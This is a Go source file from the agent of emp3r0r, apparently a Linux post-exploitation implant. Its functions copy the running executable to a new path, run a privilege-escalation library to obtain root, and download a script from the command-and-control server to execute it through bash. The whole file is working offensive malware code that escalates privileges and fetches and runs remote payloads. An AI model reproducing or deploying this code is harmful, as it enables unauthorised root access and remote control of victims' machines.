package agent

// build +linux

import (
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"os/exec"

	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	golpe "github.com/jm33-m0/go-lpe"
)

// Copy current executable to a new location
func CopySelfTo(dest_path string) (err error) {
	elf_data, err := ioutil.ReadFile("/proc/self/exe")
	if err != nil {
		return fmt.Errorf("Read self exe: %v", err)
	}

	// overwrite
	if util.IsFileExist(dest_path) {
		os.RemoveAll(dest_path)
	}

	return ioutil.WriteFile(dest_path, elf_data, 0755)
}

func GetRoot() error {
	if err := CopySelfTo("./emp3r0r"); err != nil {
		return fmt.Errorf("Self copy failed: %v", err)
	}
	return golpe.RunAll()
}

// lpeHelper runs les and upc to suggest LPE methods
func lpeHelper(method string) string {
	log.Printf("Downloading lpe script from %s", emp3r0r_data.CCAddress+method)
	var scriptData []byte
	scriptData, err := DownloadViaCC(emp3r0r_data.CCAddress+"www/"+method, "")
	if err != nil {
		return "LPE error: " + err.Error()
	}

	// run the script
	log.Println("Running LPE suggest")
	cmd := exec.Command("/bin/bash", "-c", string(scriptData))
	if method == "lpe_lse" {
		cmd = exec.Command("/bin/bash", "-c", string(scriptData), "-i")
	}

	outBytes, err := cmd.CombinedOutput()
	if err != nil {
		return "LPE error: " + string(outBytes)
	}

	return string(outBytes)
}
